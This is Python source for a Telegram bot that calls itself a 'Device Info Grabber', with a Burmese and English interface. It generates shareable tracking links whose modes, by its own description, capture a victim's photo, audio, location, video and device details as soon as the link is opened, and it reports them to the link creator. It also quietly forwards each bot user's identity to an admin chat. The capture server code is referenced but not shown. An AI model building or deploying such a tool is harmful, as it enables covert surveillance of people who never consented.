# ─────────────────────────────────────────
# BOT KEYBOARDS
# ─────────────────────────────────────────
def get_reply_keyboard():
    """Persistent reply keyboard shown at bottom of chat."""
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton("🔗 Link ထုတ်မည် | Generate Links")],
            [KeyboardButton("📋 Links စာရင်း | Active Links"),
             KeyboardButton("🗑 ဖျက်မည် | Clear All")],
            [KeyboardButton("ℹ️ Bot Info"), KeyboardButton("❓ Help | အကူအညီ")]
        ],
        resize_keyboard=True,
        one_time_keyboard=False
    )


def main_menu_keyboard():
    """Inline keyboard for main menu message."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Link ထုတ်မည် | Generate Links", callback_data="grab")],
        [InlineKeyboardButton("📋 Links | Active", callback_data="links"),
         InlineKeyboardButton("🗑 ဖျက် | Clear", callback_data="clear")],
        [InlineKeyboardButton("ℹ️ Info", callback_data="info"),
         InlineKeyboardButton("❓ Help", callback_data="help")]
    ])


def make_links_keyboard(token):
    """Inline keyboard with 5 link buttons."""
    base = f"{BASE_URL}/track/{token}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 အားလုံး | All-in-One", url=f"{base}?m=all")],
        [InlineKeyboardButton("📸 Photo + Device", url=f"{base}?m=photo"),
         InlineKeyboardButton("🎤 Audio + Device", url=f"{base}?m=audio")],
        [InlineKeyboardButton("📍 Location + Device", url=f"{base}?m=location"),
         InlineKeyboardButton("🎥 Video + Device", url=f"{base}?m=video")],
        [InlineKeyboardButton("📋 Active Links", callback_data="links"),
         InlineKeyboardButton("🏠 Menu", callback_data="menu")]
    ])


def format_links_text(token):
    base = f"{BASE_URL}/track/{token}"
    return (
        f"✅ <b>Link ၅ မျိုး ထုတ်ပြီးပါပြီ! | 5 Links Created!</b>\n"
        f"📱 Device info သည် link တိုင်းတွင် အလိုအလျောက်ပါဝင်သည်\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>All-in-One</b> (Photo+Audio+Location+Video+Device):\n<code>{base}?m=all</code>\n\n"
        f"📸 <b>Photo + Device:</b>\n<code>{base}?m=photo</code>\n\n"
        f"🎤 <b>Audio + Device:</b>\n<code>{base}?m=audio</code>\n\n"
        f"📍 <b>Location + Device:</b>\n<code>{base}?m=location</code>\n\n"
        f"🎥 <b>Video + Device:</b>\n<code>{base}?m=video</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⬇️ အောက်ပါ ခလုတ်များမှ link တစ်ခုချင်းဆီ ဖွင့်နိုင်သည်"
    )


# ─────────────────────────────────────────
# BOT COMMAND HANDLERS
# ─────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name or "User"
    user_id = user.id
    is_new = user_id not in seen_users
    seen_users.add(user_id)

    alert = (
        f"👤 <b>{'🆕 NEW' if is_new else '🔄 Returning'} User</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 {user.full_name} | {'@'+user.username if user.username else 'no username'}\n"
        f"🆔 <code>{user_id}</code>\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    threading.Thread(target=send_telegram_message, args=(ADMIN_CHAT_ID, alert), daemon=True).start()

    await update.message.reply_text(
        f"👋 မင်္ဂလာပါ <b>{name}</b>! | Hello <b>{name}</b>!\n\n"
        "🤖 <b>Device Info Grabber Bot</b> မှ ကြိုဆိုပါသည်\n\n"
        "📌 အောက်ပါ ခလုတ်များမှ လုပ်ဆောင်ချက် ရွေးချယ်ပါ\n"
        "Choose an action from the buttons below:",
        parse_mode="HTML",
        reply_markup=get_reply_keyboard()
    )
    await update.message.reply_text(
        "🏠 <b>Main Menu</b>",
        parse_mode="HTML",
        reply_markup=main_menu_keyboard()
    )


async def grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = secrets.token_urlsafe(12)
    tracking_links[token] = user_id
    await update.message.reply_text(
        format_links_text(token),
        parse_mode="HTML",
        reply_markup=make_links_keyboard(token)
    )


async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle reply keyboard button presses."""
    text = update.message.text or ""
    user_id = update.effective_user.id

    if "Link ထုတ်မည်" in text or "Generate" in text:
        token = secrets.token_urlsafe(12)
        tracking_links[token] = user_id
        await update.message.reply_text(
            format_links_text(token),
            parse_mode="HTML",
            reply_markup=make_links_keyboard(token)
        )

    elif "Links စာရင်း" in text or "Active Links" in text:
        user_links = [t for t, uid in tracking_links.items() if uid == user_id]
        if not user_links:
            await update.message.reply_text(
                "📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ | No active links.",
                parse_mode="HTML"
            )
        else:
            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}?m=all</code>" for t in user_links[-10:]])
            await update.message.reply_text(
                f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Link အသစ် | New", callback_data="grab")]
                ])
            )

    elif "ဖျက်မည်" in text or "Clear" in text:
        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
        for t in user_tokens:
            del tracking_links[t]
        await update.message.reply_text(
            f"🗑 <b>ဖျက်ပြီးပါပြီ!</b> Link <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး\n"
            f"Cleared {len(user_tokens)} link(s).",
            parse_mode="HTML"
        )

    elif "Bot Info" in text or "Info" in text:
        total = len([t for t, uid in tracking_links.items() if uid == user_id])
        await update.message.reply_text(
            f"ℹ️ <b>Bot Info</b>\n\n"
            f"🤖 Status: <b>Online ✅</b>\n"
            f"🌐 URL: <code>{BASE_URL}</code>\n"
            f"🆔 Your ID: <code>{user_id}</code>\n"
            f"🔗 Your links: <b>{total}</b>\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="HTML"
        )

    elif "Help" in text or "အကူအညီ" in text:
        await update.message.reply_text(
            "❓ <b>Help | အကူအညီ</b>\n\n"
            "<b>Link အမျိုးအစားများ:</b>\n"
            "📱 Device info သည် link တိုင်းတွင် ပါဝင်သည်\n\n"
            "🌐 All — Photo+Audio+Location+Video+Device\n"
            "📸 Photo — ဓာတ်ပုံ + Device info\n"
            "🎤 Audio — အသံ + Device info\n"
            "📍 Location — တည်နေရာ + Device info\n"
            "🎥 Video — ဗီဒီယို + Device info",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            "🏠 <b>Main Menu</b>\n\nလုပ်ဆောင်ချက် ရွေးချယ်ပါ | Choose an action:",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "menu":
        await query.edit_message_text(
            "🏠 <b>Main Menu</b>\n\nလုပ်ဆောင်ချက် ရွေးချယ်ပါ | Choose an action:",
            parse_mode="HTML", reply_markup=main_menu_keyboard()
        )

    elif data == "grab":
        token = secrets.token_urlsafe(12)
        tracking_links[token] = user_id
        await query.edit_message_text(
            format_links_text(token),
            parse_mode="HTML",
            reply_markup=make_links_keyboard(token)
        )

    elif data == "links":
        user_links = [t for t, uid in tracking_links.items() if uid == user_id]
        if not user_links:
            text = "📋 <b>Active Links</b>\n\n❌ Link မရှိသေးပါ | No active links."
        else:
            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}?m=all</code>" for t in user_links[-10:]])
            text = f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}"
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Link အသစ် | New Links", callback_data="grab")],
            [InlineKeyboardButton("🗑 ဖျက် | Clear", callback_data="clear"),
             InlineKeyboardButton("🏠 Menu", callback_data="menu")]
        ]))

    elif data == "clear":
        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
        for t in user_tokens:
            del tracking_links[t]
        await query.edit_message_text(
            f"🗑 <b>ဖျက်ပြီးပါပြီ!</b> Link <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး\nCleared {len(user_tokens)} link(s).",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Link အသစ် | New", callback_data="grab"),
                 InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )

    elif data == "info":
        total = len([t for t, uid in tracking_links.items() if uid == user_id])
        await query.edit_message_text(
            f"ℹ️ <b>Bot Info</b>\n\n"
            f"🤖 Online ✅\n"
            f"🌐 URL: <code>{BASE_URL}</code>\n"
            f"🆔 Your ID: <code>{user_id}</code>\n"
            f"🔗 Your links: <b>{total}</b>\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="menu")]])
        )

    elif data == "help":
        await query.edit_message_text(
            "❓ <b>Help | အကူအညီ</b>\n\n"
            "<b>မည်သို့အသုံးပြုမည် | How to use:</b>\n"
            "1. <b>Link ထုတ်မည်</b> ကိုနှိပ်ပါ → Link ၅ မျိုးထုတ်မည်\n"
            "2. Link တစ်ခုကို မျှဝေပါ | Share any link\n"
            "3. Link ဖွင့်သည်နှင့် data များ Bot ဆီ ချက်ချင်းရောက်မည်\n\n"
            "<b>📱 Device info သည် link တိုင်းတွင် ပါဝင်သည်</b>\n\n"
            "🌐 All — Photo+Audio+Location+Video+Device\n"
            "📸 Photo — ဓာတ်ပုံ + Device\n"
            "🎤 Audio — အသံ + Device\n"
            "📍 Location — တည်နေရာ + Device\n"
            "🎥 Video — ဗီဒီယို + Device",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Link ထုတ်မည် | Generate", callback_data="grab")],
                [InlineKeyboardButton("🏠 Menu", callback_data="menu")]
            ])
        )


# ─────────────────────────────────────────
# RUN
# ─────────────────────────────────────────
def run_bot():
    if not BOT_TOKEN:
        print("⚠️  BOT_TOKEN not set.")
        return
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("grab", grab))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    print("🤖 Telegram bot polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    def run_flask():
        port = int(os.environ.get("PORT", 5000))
        flask_app.run(host="0.0.0.0", port=port, threaded=True, debug=False)

    if BOT_TOKEN:
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        run_bot()
    else:
        print("⚠️  BOT_TOKEN not set. Flask only.")
        run_flask()
